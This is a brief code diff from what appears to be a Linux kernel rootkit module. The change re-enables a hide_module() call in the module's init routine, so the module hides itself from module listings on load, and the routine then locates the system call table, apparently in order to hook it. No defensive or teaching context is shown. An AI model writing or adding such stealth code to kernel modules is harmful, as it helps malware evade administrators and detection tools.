@@ -354,7 +354,7 @@ void show_module(void) {
 }
 
 static int init(void) {
-  // hide_module();
+  hide_module();
   printk("\nModule starting...\n");
   syscall_table = (unsigned long long*) find();
   if ( syscall_table != NULL ) {
